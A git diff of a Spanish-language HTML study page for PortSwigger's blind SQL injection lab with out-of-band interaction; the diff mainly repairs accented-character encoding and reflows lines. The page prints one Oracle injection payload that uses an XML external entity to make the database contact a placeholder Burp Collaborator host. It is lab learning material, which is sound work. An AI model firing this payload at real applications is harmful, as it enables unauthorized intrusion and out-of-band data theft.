@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Lab 16 - Blind SQLi - interacciÃ³n out-of-band</title>
+    <title>Lab 16 - Blind SQLi - interacción out-of-band</title>
     <style>
         html,
         body {
@@ -113,7 +113,10 @@
 
 <body>
     <div style="padding: 20px; max-width: 1000px; margin: 0 auto; padding-bottom: 0;">
-        <button onclick="parent.cargaPractica('html/sql_injection.html')" style="background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%); color: #1e3a8a; border: 1px solid #e2e8f0; border-left: 5px solid #3b82f6; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1.15rem; font-weight: 700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); transition: all 0.4s ease;" onmouseover="this.style.transform='translateY(-4px) scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(59, 130, 246, 0.2)'; this.style.borderColor='#3b82f6'" onmouseout="this.style.transform='translateY(0) scale(1)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.05)'; this.style.borderColor='#e2e8f0'">
+        <button onclick="parent.cargaPractica('html/sql_injection.html')"
+            style="background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%); color: #1e3a8a; border: 1px solid #e2e8f0; border-left: 5px solid #3b82f6; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1.15rem; font-weight: 700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); transition: all 0.4s ease;"
+            onmouseover="this.style.transform='translateY(-4px) scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(59, 130, 246, 0.2)'; this.style.borderColor='#3b82f6'"
+            onmouseout="this.style.transform='translateY(0) scale(1)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.05)'; this.style.borderColor='#e2e8f0'">
             &#8592; Regresar al Roadmap
         </button>
     </div>
@@ -121,31 +124,50 @@
         <div class="wrap">
             <div class="panel">
                 <h1>Laboratorio 16</h1>
-                <h2>Blind SQLi - interacciÃ³n out-of-band</h2>
+                <h2>Blind SQLi - interacción out-of-band</h2>
                 <p>PortSwigger Web Security Academy</p>
             </div>
         </div>
 
         <div class="section">
-            <h3 class="section-title">IntroducciÃ³n</h3>
+            <h3 class="section-title">Introducción</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">Este laboratorio contiene una vulnerabilidad de inyecciÃ³n SQL ciega, paralela a las anteriores. La diferencia clave radica en que las peticiones SQL se ejecutan asincrÃ³nicamente, por lo que las demoras de tiempo controladas no surten efecto. La aplicaciÃ³n no devuelve errores ni cambia sus vistas.</p>
+            <p class="parrafo">Este laboratorio contiene una vulnerabilidad de inyección SQL ciega, paralela a las
+                anteriores. La diferencia clave radica en que las peticiones SQL se ejecutan asincrónicamente, por lo
+                que las demoras de tiempo controladas no surten efecto. La aplicación no devuelve errores ni cambia sus
+                vistas.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Desarrollo</h3>
         </div>
         <div class="content-area">
-            <p class='parrafo'>El reto aquÃ­ es engaÃ±ar a la base de datos para que interactÃºe independientemente y de manera externa con una red controlada por nosotros (por ejemplo, mediante solicitudes DNS) para probar la inyecciÃ³n.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Copiamos nuestro subdominio de Burp Collaborator (Burp OAST).</p><p class='parrafo'>2. Inyectamos un payload de Oracle que intenta forzar exteriormente la resoluciÃ³n de un nombre de red: <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//nuestro-colaborador.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--</code>.</p><p class='parrafo'>3. Evaluamos la pantalla de Burp Collaborator observando un 'DNS Lookup' a nuestro dominio.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>ExplicaciÃ³n</p><p class='parrafo'>Cuando los canales en banda de la aplicaciÃ³n se agotan o filtran, las bases de datos corporativas a veces estÃ¡n permitidas de resolver o contactar servidores. Una interacciÃ³n fuera de banda confirma la vulnerabilidad.</p>
+            <p class='parrafo'>El reto aquí es engañar a la base de datos para que interactúe independientemente y de
+                manera externa con una red controlada por nosotros (por ejemplo, mediante solicitudes DNS) para probar
+                la inyección.</p>
+            <p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p>
+            <p class='parrafo'>1. Copiamos nuestro subdominio de Burp Collaborator (Burp OAST).</p>
+            <p class='parrafo'>2. Inyectamos un payload de Oracle que intenta forzar exteriormente la resolución de un
+                nombre de red:
+                <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//nuestro-colaborador.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--</code>.
+            </p>
+            <p class='parrafo'>3. Evaluamos la pantalla de Burp Collaborator observando un 'DNS Lookup' a nuestro
+                dominio.</p>
+            <p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicación</p>
+            <p class='parrafo'>Cuando los canales en banda de la aplicación se agotan o filtran, las bases de datos
+                corporativas a veces están permitidas de resolver o contactar servidores. Una interacción fuera de banda
+                confirma la vulnerabilidad.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Contenido Multimedia</h3>
         </div>
         <div class="content-area" style="text-align: center;">
-            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaciÃ³n de prueba.</p>
-            <div style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
+            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads
+                ejecutados exitosamente en la aplicación de prueba.</p>
+            <div
+                style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
                 [Espacio reservado para captura de pantalla del usuario]
             </div>
         </div>
@@ -158,13 +180,13 @@
         </div>
 
         <div class="section">
-            <h3 class="section-title">Referencias TÃ©cnicas</h3>
+            <h3 class="section-title">Referencias Técnicas</h3>
         </div>
         <div class="content-area">
-            <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>Blind SQL injection with out-of-band interaction</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
+            <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>Blind SQL injection with out-of-band
+                    interaction</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
         </div>
     </div>
 </body>
 
 </html>
-
